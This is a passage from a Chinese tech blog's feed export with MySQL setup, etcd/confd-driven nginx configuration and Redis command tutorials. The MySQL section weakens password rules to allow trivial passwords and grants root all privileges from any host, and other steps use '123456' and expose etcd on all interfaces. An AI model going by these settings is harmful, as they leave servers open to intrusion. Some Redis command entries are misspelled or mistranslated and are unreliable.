<h4 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# yum -y install mysql-community-server`</span><br></pre></td></tr></table></figure>

<p>这步可能会花些时间，安装完成后就会覆盖掉之前的mariadb。</p>
<p><img src="/articles/db063ff7/1.png" alt="img"></p>
<p>出现这样的提示表示安装成功</p>
<h2 id="数据库设置"><a href="#数据库设置" class="headerlink" title="数据库设置"></a>数据库设置</h2><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# systemctl start  mysqld.service`</span><br></pre></td></tr></table></figure>

<h4 id="查看运行状态"><a href="#查看运行状态" class="headerlink" title="查看运行状态"></a>查看运行状态</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# systemctl status mysqld.service`</span><br></pre></td></tr></table></figure>

<p><img src="/articles/db063ff7/2.png" alt="img"></p>
<p>此时MySQL已经开始正常运行，不过要想进入MySQL还得先找出此时root用户的密码，通过如下命令可以在日志文件中找出密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# grep "password" /var/log/mysqld.log`</span><br></pre></td></tr></table></figure>

<p><img src="/articles/db063ff7/3.png" alt="img"></p>
<p>上面标记的就是初始密码</p>
<p> 如下命令进入数据库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu /]``# mysql -uroot -p     # 回车后会提示输入密码`</span><br></pre></td></tr></table></figure>

<p>输入初始密码，此时不能做任何事情，因为MySQL默认必须修改密码之后才能操作数据库：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">`mysql&gt; ``ALTER` `USER` `'root'``@``'localhost'` `IDENTIFIED ``BY` `'new password'``;`</span><br></pre></td></tr></table></figure>

<p>这里有个问题，新密码设置的时候如果设置的过于简单会报错：</p>
<p><img src="/articles/db063ff7/4.png" alt="img"></p>
<p>原因是因为MySQL有密码设置的规范，具体是与validate_password_policy的值有关：</p>
<p><img src="/articles/db063ff7/6.png" alt="img"></p>
<p>MySQL完整的初始密码规则可以通过如下命令查看：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">`mysql&gt; SHOW VARIABLES ``LIKE` `'validate_password%'``;``+``--------------------------------------+-------+``| Variable_name                        | Value |``+``--------------------------------------+-------+``| validate_password_check_user_name    | ``OFF`   `|``| validate_password_dictionary_file    |       |``| validate_password_length             | 4     |``| validate_password_mixed_case_count   | 1     |``| validate_password_number_count       | 1     |``| validate_password_policy             | LOW   |``| validate_password_special_char_count | 1     |``+``--------------------------------------+-------+``rows` `in` `set` `(0.01 sec)`</span><br></pre></td></tr></table></figure>

<p> 密码的长度是由validate_password_length决定的，而validate_password_length的计算公式是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`validate_password_length = validate_password_number_count + validate_password_special_char_count + (2 * validate_password_mixed_case_count)`</span><br></pre></td></tr></table></figure>

<p>　解决方法就是修改密码为规范复杂的密码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">`mysql&gt; ``ALTER` `USER` `'root'``@``'localhost'` `IDENTIFIED ``BY` `'z?guwrBhH7p&gt;'``;``Query OK, 0 ``rows` `affected (0.00 sec)` `mysql&gt;`</span><br></pre></td></tr></table></figure>

<p><img src="/articles/db063ff7/5.png" alt="img"></p>
<p>这时候我们要把密码规则改一下，执行下面sql就可以了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">`mysql&gt; ``set` `global` `validate_password_policy=0;``Query OK, 0 ``rows` `affected (0.00 sec)` `mysql&gt; ``set` `global` `validate_password_length=1;``Query OK, 0 ``rows` `affected (0.00 sec)` `mysql&gt;`</span><br></pre></td></tr></table></figure>

<p> 设置之后就是我上面查出来的那几个值了，此时密码就可以设置的很简单，例如1234之类的。到此数据库的密码设置就完成了。</p>
<p> 但此时还有一个问题，就是因为安装了Yum Repository，以后每次yum操作都会自动更新，需要把这个卸载掉：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">`[root@BrianZhu ~]``# yum -y remove mysql57-community-release-el7-10.noarch`</span><br></pre></td></tr></table></figure>

<p>　配置算是完成了</p>
<h2 id="可视化工具的登录授权："><a href="#可视化工具的登录授权：" class="headerlink" title="可视化工具的登录授权："></a>可视化工具的登录授权：</h2><p>注意：如果授权不成功，请查看防火墙</p>
<p>操作完成上面的，现在还不能用可视化的客户端进行连接，需要我们进行授权：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">`<span class="keyword">grant</span><span class="string">` `</span><span class="keyword">all</span><span class="string">` `</span><span class="keyword">on</span><span class="string">` `</span>*.* <span class="string">``</span><span class="keyword">to</span><span class="string">` `</span>root@<span class="string">``</span><span class="string">'%'</span><span class="string">` `</span><span class="keyword">identified</span> <span class="string">``</span><span class="keyword">by</span><span class="string">` `</span><span class="string">'数据库密码'</span><span class="string">``</span>;`</span><br></pre></td></tr></table></figure>

<p>大功告成！！！</p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx配置管理平台</title>
    <url>/articles/a5026eaa.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>熟悉nginx的配置不难发现，nginx是一个典型的key value类型的，而且与文件系统的非常类似，一个目录下面可以包含其他配置，目录下还可以有目录，嵌套多层。如今key value类型的数据库非常多，redis、leveldb等，最近新秀etcd也是key-value分布式数据库，提供类似文件系统操作，使用raft协议保持数据一致性，非常适合云计算分布式部署场景，将confd与etcd搭配，非常适合nginx这样的配置格式。本文就详细讲解了nginx配置管理平台的实现。</p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CentOS 7.x x64</span><br><span class="line">Python:  2.7.6</span><br><span class="line">Etcd： 3.2.18</span><br><span class="line">Confd:  0.16.0</span><br><span class="line">Nginx: 1.12.1</span><br></pre></td></tr></table></figure>

<h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><strong>简易拓扑</strong></p>
<p><img src="/articles/a5026eaa/1.png" alt></p>
<p><strong>配置平台详情拓扑</strong></p>
<p><img src="/articles/a5026eaa/8.png" alt></p>
<h2 id="涉及软件"><a href="#涉及软件" class="headerlink" title="涉及软件"></a>涉及软件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">etcd：分布式KV存储系统，一般用于共享配置和服务注册与发现。是CoreOS公司发起的一个开源项目。 ETCD存储格式类似于文件系统，以根"/"开始下面一级级目录，最后一个是Key，一个key对应一个Value。</span><br><span class="line">etcd集群：使用Raft协议保证每个节点数据一致，由多个节点对外提供服务。这里只用单台。</span><br><span class="line"></span><br><span class="line">confd：管理本地应用配置文件，使用etcd或consul存储的数据渲染模板，还支持redis、zookeeper等。</span><br><span class="line">confd有一个watch功能，通过HTTP API定期监测对应的etcd中目录变化，获取最新的Value，然后渲染模板</span><br><span class="line">Nginx:  Nginx是一款轻量级的Web服务器/反向代理服务器以及电子邮件代理服务器，并在一个BSD-like协议下发行。由俄罗斯的程序设计师lgor Sysoev所开发，供俄国大型的入口网站及搜索引擎Rambler使用。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。</span><br></pre></td></tr></table></figure>

<h2 id="软件部署"><a href="#软件部署" class="headerlink" title="软件部署"></a>软件部署</h2><h4 id="安装etcd"><a href="#安装etcd" class="headerlink" title="安装etcd"></a>安装etcd</h4><p>注意：这里安装的单机,集群环境根据自己的需求选取</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install etcd -y</span><br><span class="line">sed -i  's/localhost/0.0.0.0/g'  /etc/etcd/etcd.conf  #配置监听地址</span><br><span class="line">systemctl   start  etcd  &amp;&amp;  systemctl  enable  etcd  #启动服务设置开机动</span><br></pre></td></tr></table></figure>

<h4 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装依赖包</span></span><br><span class="line">yum install  python-devel gcc gcc-c++ pcre  pcre-devel   patch   unzip   zlib  zlib-devel  openssl openssl-devel  git  -y  #依赖包</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载nginx包</span></span><br><span class="line">cd  /usr/local/src</span><br><span class="line">wget  http://nginx.org/download/nginx-1.12.1.tar.gz</span><br><span class="line">git clone https://github.com/yaoweibin/nginx_upstream_check_module.git  </span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">tar  -zxvf  nginx-1.12.1.tar.gz </span><br><span class="line">cd nginx-1.12.1</span><br><span class="line">patch  -p1 &lt;/usr/local/src/nginx_upstream_check_module/check_1.12.1+.patch</span><br><span class="line"></span><br><span class="line">./configure   --prefix=/usr/local/nginx --add-module=/usr/local/src/nginx_upstream_check_module/</span><br><span class="line"></span><br><span class="line">make -j4 &amp;&amp; make install</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改配置</span></span><br><span class="line">mkdir  /usr/local/nginx/conf/vhost/</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nginx http的配置文件修改为这个样子,增加include目录配置</span></span><br><span class="line">vim  /usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br><span class="line">  http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span><br><span class="line">    #                  '$status $body_bytes_sent "$http_referer" '</span><br><span class="line">    #                  '"$http_user_agent" "$http_x_forwarded_for"';</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include   vhost/*.conf;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="安装confd"><a href="#安装confd" class="headerlink" title="安装confd"></a>安装confd</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载地址https://github.com/kelseyhightower/confd/releases</span><br><span class="line">下载完毕丢到系统里面</span><br><span class="line">cp confd  /usr/bin/confd </span><br><span class="line">which  confd</span><br><span class="line"><span class="meta">#</span><span class="bash">/usr/bin/confd</span></span><br></pre></td></tr></table></figure>

<h4 id="创建配置文件目录"><a href="#创建配置文件目录" class="headerlink" title="创建配置文件目录"></a>创建配置文件目录</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/confd/&#123;conf.d,templates&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> conf.d          <span class="comment"># 资源模板，下面文件必须以toml后缀</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> templates       <span class="comment"># 配置文件模板，下面文件必须以tmpl后缀</span></span></span><br></pre></td></tr></table></figure>

<h4 id="创建confd配置文件"><a href="#创建confd配置文件" class="headerlink" title="创建confd配置文件"></a>创建confd配置文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/confd/conf.d/test.conf.toml</span><br><span class="line"></span><br><span class="line">[template]</span><br><span class="line">src = "test.conf.tmpl"                              #默认在/etc/confd/templates目录下</span><br><span class="line">dest = "/usr/local/nginx/conf/vhost/test.conf"      #要更新的配置文件</span><br><span class="line">keys = [</span><br><span class="line">"/Shopping",                                      #监测的key</span><br><span class="line">]</span><br><span class="line">check_cmd = "/usr/local/nginx/sbin/nginx -t"   #配置文件测试</span><br><span class="line">reload_cmd ="/usr/local/nginx/sbin/nginx -s reload"   #加载配置文件</span><br></pre></td></tr></table></figure>

<h4 id="创建confd模板"><a href="#创建confd模板" class="headerlink" title="创建confd模板"></a>创建confd模板</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi  /etc/confd/templates/app01.conf.tmpl </span><br><span class="line">	</span><br><span class="line">	upstream &#123;&#123;getv "/Shopping/nginx/cluster1/proxy_name"&#125;&#125; &#123;</span><br><span class="line">		&#123;&#123;range getvs "/Shopping/nginx/cluster1/upstream/*"&#125;&#125;</span><br><span class="line">			server &#123;&#123;.&#125;&#125;;</span><br><span class="line">		&#123;&#123;end&#125;&#125;</span><br><span class="line"></span><br><span class="line">	  check interval=5000 rise=1 fall=5 timeout=4000 type=http;</span><br><span class="line">	  check_http_send "HEAD / HTTP/1.0\r\n\r\n";</span><br><span class="line">	  check_http_expect_alive http_2xx http_3xx;</span><br><span class="line">	&#125;</span><br><span class="line">	  </span><br><span class="line">	server &#123;</span><br><span class="line">	   server_name &#123;&#123;range getvs "/Shopping/nginx/cluster1/server_name/*"&#125;&#125; &#123;&#123;.&#125;&#125; &#123;&#123;end&#125;&#125;;</span><br><span class="line">	   location / &#123;</span><br><span class="line">		   proxy_pass        http://&#123;&#123;getv  "/Shopping/nginx/cluster1/proxy_name"&#125;&#125;;</span><br><span class="line">		   proxy_redirect off;</span><br><span class="line">		   proxy_set_header Host $host;</span><br><span class="line">		   proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">		   proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">		&#125;</span><br><span class="line">		  location /status &#123;</span><br><span class="line">					check_status;</span><br><span class="line">					access_log   off;</span><br><span class="line">			   &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="在Ectd中写入变量"><a href="#在Ectd中写入变量" class="headerlink" title="在Ectd中写入变量"></a>在Ectd中写入变量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">etcdctl set /Shopping/nginx/cluster1/proxy_name test.com</span><br><span class="line">etcdctl set /Shopping/nginx/cluster1/server_name/servername shopping.com</span><br><span class="line">etcdctl set /Shopping/nginx/cluster1/upstream/serverA 192.168.1.2:8080</span><br><span class="line">etcdctl set /Shopping/nginx/cluster1/upstream/serverB 192.168.1.3:8080</span><br></pre></td></tr></table></figure>

<h4 id="启动confd并设置开机启动"><a href="#启动confd并设置开机启动" class="headerlink" title="启动confd并设置开机启动"></a>启动confd并设置开机启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 需要更改etcd 的连接地址即可</span></span><br><span class="line">nohup confd -watch -backend etcd -node http://localhost:2379 &amp;</span><br></pre></td></tr></table></figure>

<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p>confd启动后会自动生成配置文件，如图：</p>
<p><img src="/articles/a5026eaa/6.png" alt></p>
<h2 id="配置平台部署"><a href="#配置平台部署" class="headerlink" title="配置平台部署"></a>配置平台部署</h2><p>配置Python环境</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install python-pip -y         #安装pip</span><br><span class="line">mkdir /root/.pip/               #创建pip源配置文件目录</span><br><span class="line">vim  /root/.pip/pip.conf          #修改为阿里云的pip源</span><br><span class="line">	[global]</span><br><span class="line">	trusted-host=mirrors.aliyun.com</span><br><span class="line">	index-url=http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line">	[list]</span><br><span class="line">	format=columns</span><br></pre></td></tr></table></figure>

<h4 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install   virtualenv         #安装沙盒工具</span><br><span class="line">virtualenv   env                 #建议创建一个沙盒环境跑该平台</span><br><span class="line">source  env/bin/activate         #使用沙盒环境</span><br><span class="line"></span><br><span class="line">git  clone  https://github.com/1032231418/Conf_Web.git</span><br><span class="line">cd  Conf_Web/ospweb/</span><br><span class="line">pip install -r requirement.txt   #安装相关软件</span><br></pre></td></tr></table></figure>

<h4 id="创建数据库并将表刷入数据库"><a href="#创建数据库并将表刷入数据库" class="headerlink" title="创建数据库并将表刷入数据库"></a>创建数据库并将表刷入数据库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql  -p          #登录数据库为平台创建一个数据库</span><br><span class="line">CREATE DATABASE  opsweb  CHARACTER SET utf8 COLLATE utf8_general_ci;      #创建数据库</span><br><span class="line"></span><br><span class="line">vi opsweb/settings.py   #这里数据库信息改为自己的数据库信息</span><br><span class="line">  DATABASES = &#123;</span><br><span class="line">    'default': &#123;</span><br><span class="line">    'ENGINE': 'django.db.backends.mysql',</span><br><span class="line">    'NAME': 'opsweb',</span><br><span class="line">    'HOST': 'localhost',</span><br><span class="line">    'USER': 'root',</span><br><span class="line">    'PASSWORD': '123456',</span><br><span class="line">    'PORT': 3306,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ETCD_Server = "192.168.0.221"        #这里改为自己etcd 的ip地址</span><br><span class="line">  ETCD_Port = 2379</span><br><span class="line">		</span><br><span class="line">python manage.py   migrate          #提交迁移文件至数据库,将表刷入数据库</span><br></pre></td></tr></table></figure>

<h4 id="创建超级管理员账号"><a href="#创建超级管理员账号" class="headerlink" title="创建超级管理员账号"></a>创建超级管理员账号</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python manage.py  createsuperuser</span><br></pre></td></tr></table></figure>

<h4 id="运行平台"><a href="#运行平台" class="headerlink" title="运行平台"></a>运行平台</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python manage.py  runserver 0:8000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 访问地址就是 http://ip:8000   账号密码就是上一步创建的超级管理员账号密码</span></span><br></pre></td></tr></table></figure>

<h4 id="登录平台为nginx创建key-value"><a href="#登录平台为nginx创建key-value" class="headerlink" title="登录平台为nginx创建key/value"></a>登录平台为nginx创建key/value</h4><pre><code>以Shopping 平台为例

项目创建:
1.创建商城项目  /Shopping
2.创建商城项目里面的 /Shopping/nginx   nginx 服务
3.创建nginx 集群目录  /Shopping/nginx/cluster1
4.给我们的商城nginx集群1项目创建配置文件
5.域名 和 节点名称可能是多个，这里我们需要创建目录 /Shopping/nginx/cluster1/server_name 和 /Shopping/nginx/cluster1/upstream</code></pre><p><img src="/articles/a5026eaa/2.png" alt></p>
<p><img src="/articles/a5026eaa/3.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">配置创建:</span><br><span class="line">1.反向代理        /Shopping/nginx/cluster1/proxy_name  </span><br><span class="line">2.绑定一个域名     /Shopping/nginx/cluster1/server_name/1	</span><br><span class="line">3.创建一个集群节点 /Shopping/nginx/cluster1/upstream/web1</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a5026eaa/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">etcd 里面存储的值</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a5026eaa/5.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">生成的配置文件</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a5026eaa/6.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过hosts 文件我们可以查看节点状态(虽然这个节点不是up 状态但是由此可见,我们可以动态添加节点)</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a5026eaa/7.png" alt></p>
<h2 id="nginx-uwsgi-django项目部署"><a href="#nginx-uwsgi-django项目部署" class="headerlink" title="nginx + uwsgi + django项目部署"></a>nginx + uwsgi + django项目部署</h2><h4 id="uwsgi-部署"><a href="#uwsgi-部署" class="headerlink" title="uwsgi 部署"></a>uwsgi 部署</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source  env/bin/activate      #使用沙盒</span><br><span class="line">pip install uwsgi             #安装 uwsgi</span><br><span class="line"></span><br><span class="line">vim   uwsgi.ini </span><br><span class="line">[uwsgi]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置服务器的监听ip和端口，让uWSGI作为nginx的支持服务器的话，设置socke就行；如果要让uWSGI作为单独的web-server，用http</span></span><br><span class="line">http = 127.0.0.1:8000</span><br><span class="line"><span class="meta">#</span><span class="bash">socket = 127.0.0.1:3309</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置项目目录（此处设置为项目的根目录）</span></span><br><span class="line">chdir =  /home/web/opsweb</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置入口模块 (django的入口函数的模块，即setting同级目录下的wsgi.py)</span></span><br><span class="line">wsgi-file =  opsweb/wsgi.py</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启master, 将会多开一个管理进程, 管理其他服务进程</span></span><br><span class="line">master = True</span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务器开启的进程数量</span></span><br><span class="line">processes = 8</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以守护进程方式提供服, 输出信息将会打印到<span class="built_in">log</span>中</span></span><br><span class="line">daemonize = wsgi.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务器进程开启的线程数量</span></span><br><span class="line">threads = 4</span><br><span class="line"><span class="meta">#</span><span class="bash"> 退出的时候清空环境变量</span></span><br><span class="line">vacuum = true</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进程pid</span></span><br><span class="line">pidfile = uwsgi.pid</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配uWSGI搜索静态文件目录（及django项目下我们存放static文件的目录，用uWSGI作为单独服务器时才需要设置，此时我们是用nginx处理静态文件）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> check-static =  /home/web/opsweb/static/</span></span><br><span class="line"></span><br><span class="line">/home/env/bin/uwsgi --ini uwsgi.ini   #启动服务</span><br></pre></td></tr></table></figure>

<h4 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim  /usr/local/nginx/conf/vhost/ops.conf</span><br><span class="line"></span><br><span class="line">  upstream  ops_web &#123;</span><br><span class="line">      server  127.0.0.1:8000;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  server &#123;</span><br><span class="line">     server_name    ops.xxx.com;       #改为你平台的域名</span><br><span class="line">     location / &#123;</span><br><span class="line">       proxy_pass        http://ops_web;</span><br><span class="line">       proxy_redirect off;</span><br><span class="line">       proxy_set_header Host $host;</span><br><span class="line">       proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">       proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">          alias  /home/web/opsweb/static/;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">/usr/local/nginx/sbin/nginx  -s  reload  #重新加载配置文件</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis系列之数据类型和操作</title>
    <url>/articles/dfc587ba.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>Redis是一种支持Key-Value等多种数据结构的存储系统。可用于缓存，事件发布或订阅，高速队列等场景。该数据库使用ANSI C语言编写，支持网络，提供字符串，哈希，列表，队列，集合结构直接存取，基于内存，可持久化。本文介绍Redis的数据类型和相关操作。</p>
<a id="more"></a>

<h2 id="支持的语言"><a href="#支持的语言" class="headerlink" title="支持的语言"></a><strong>支持的语言</strong></h2><p><img src="/articles/dfc587ba/1.png" alt></p>
<h2 id="Redis的应用场景"><a href="#Redis的应用场景" class="headerlink" title="Redis的应用场景"></a><strong>Redis的应用场景</strong></h2><p>1，会话缓存（最常用）</p>
<p>2，消息队列，比如支付</p>
<p>3，活动排行榜或计数</p>
<p>4，发布，订阅消息（消息通知）</p>
<p>5，商品列表，评论列表等</p>
<h2 id="数据类型以及相关操作"><a href="#数据类型以及相关操作" class="headerlink" title="数据类型以及相关操作"></a>数据类型以及相关操作</h2><p><strong>Redis</strong>一共支持五种数据类：string（字符串），hash（哈希），list（列表），set（集合）和zset（sorted set有序集合）,在3.2版本以后新添加geo经纬度支持，以下将对其类型的常用操作做说明。</p>
<h4 id="命令使用前言"><a href="#命令使用前言" class="headerlink" title="命令使用前言"></a>命令使用前言</h4><p>通大多数据库一样，redis所有的命令提供了帮助，可以使用help +命令名称查看其使用方法，帮助信息中不仅有命令用法，还有命令始于版本信息，分组等。</p>
<p>为了友好的使用，redis还将所有命令都进行了分组,同时使用help+@+组名进行查看每个组中所有命令，以下是所有分组信息。</p>
<p>上面以及介绍如何查看命令使用方法，所以在以下数据类型操作时候，只举例常用的命令，更多命令参考<a href="https://redis.io/commands" target="_blank" rel="noopener">https://redis.io/commands</a></p>
<p>注意：redis在3.2版本新增geo数据类型。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">generic       #一般命令组，对大多数类型适用</span><br><span class="line">string        #字符串类型命令组，使用所有字符串类型</span><br><span class="line">list          #列表类型命令组</span><br><span class="line">set           #集合类型命令组</span><br><span class="line">sorted_set    #有序集合命令组</span><br><span class="line">hash          #hash操作命令组</span><br><span class="line">pubsub        #发布命令组</span><br><span class="line">transactions  #事务操作命令组</span><br><span class="line">connection    #连接相关命令组</span><br><span class="line">server        #服务器相关命令组</span><br><span class="line">scripting     #lua 脚本命令组</span><br><span class="line">hyperloglog   #hyperloglog类型命令组，redis在 2.8.9 版本添加了 HyperLogLog 结构</span><br><span class="line">cluster       #集群相关命令组</span><br><span class="line">geo           #经纬度相关命令组，适用于3.2.0以后的版本</span><br></pre></td></tr></table></figure>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h4 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a><strong>服务操作</strong></h4><p><img src="/articles/dfc587ba/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">slect＃选择数据库（数据库编号0-15）</span><br><span class="line">退出＃退出连接</span><br><span class="line">信息＃获得服务的信息与统计</span><br><span class="line">monitor＃实时监控</span><br><span class="line">config get＃获得服务配置</span><br><span class="line">flushdb＃删除当前选择的数据库中的key</span><br><span class="line">flushall＃删除所有数据库中的键</span><br></pre></td></tr></table></figure>

<h4 id="事务操作"><a href="#事务操作" class="headerlink" title="事务操作"></a>事务操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DEL key #删除某个key</span><br><span class="line">KEYS pattern  #查看符合正则的所有key</span><br><span class="line">EXISTS key [key ...] #判断某个key是否存在，可支持多个，返回存在的个数</span><br><span class="line">EXPIRE key seconds #刷新某个key过期时间</span><br><span class="line">MOVE key db  #移动key到某个数据库</span><br></pre></td></tr></table></figure>

<h4 id="string操作"><a href="#string操作" class="headerlink" title="string操作"></a>string操作</h4><p>它是redis的最基本的数据类型，一个键对应一个值，需要注意是一个键值最大存储512MB，redis中的整型也当作字符串处理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SET key value [EX seconds] [PX milliseconds] [NX|XX]  #设置key为指定的字符串值。</span><br><span class="line"><span class="meta">#</span><span class="bash">参数：</span></span><br><span class="line"><span class="meta">#</span><span class="bash">EX seconds – 设置键key的过期时间，单位时秒</span></span><br><span class="line"><span class="meta">#</span><span class="bash">PX milliseconds – 设置键key的过期时间，单位时毫秒</span></span><br><span class="line"><span class="meta">#</span><span class="bash">NX – 只有键key不存在的时候才会设置key的值</span></span><br><span class="line"><span class="meta">#</span><span class="bash">XX – 只有键key存在的时候才会设置key的值</span></span><br><span class="line"></span><br><span class="line">APPEND key value  #如果 key 已经存在，并且值为字符串，那么这个命令会把 value 追加到原来值（value）的结尾。 如果 key 不存在，那么它将首先创建一个空字符串的key，再执行追加操作，这种情况 APPEND 将类似于 SET 操作。</span><br><span class="line"></span><br><span class="line">GET key #获取key值，不存在则返回nil</span><br><span class="line"></span><br><span class="line">GETRANGE key start end #获取指定key值的索引开始位置和结束位置所对应的值，索引从0开始</span><br><span class="line"></span><br><span class="line">GETSET key value  #设置新的key值，并获取设置之前的值，如果key不存在则设置，并返回nil</span><br><span class="line"></span><br><span class="line">MGET key [key ...]   #批量获取key的值</span><br><span class="line"></span><br><span class="line">MSET key value [key value ...] #批量设置key的值</span><br><span class="line"></span><br><span class="line">DECR key #数字类型的key自减操作，key类型不是数字则报错</span><br><span class="line"></span><br><span class="line">INCR key  #数字类型key 自加操作，与DECR相反</span><br><span class="line"></span><br><span class="line">DECRBY key decrement  #数字类型key指定减少数值</span><br><span class="line"></span><br><span class="line">INCRBY key increment   #数字类型key指定增加数值，与DECRBY相反</span><br><span class="line"></span><br><span class="line">STRLEN key  #获取key长度</span><br></pre></td></tr></table></figure>

<p><img src="/articles/dfc587ba/2.png" alt></p>
<h4 id="list操作"><a href="#list操作" class="headerlink" title="list操作"></a>list操作</h4><p>列表中的元素索引从0开始，倒数的元素可以用“-”+倒数位置表示，如-2，代表倒数第二个元素，-1则代表最后一个元素。</p>
<p>Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部（左边）或者尾部（右边。</p>
<p>一个列表最多可以包含 2 32 - 1 个元素 (4294967295, 每个列表超过40亿个元素)。</p>
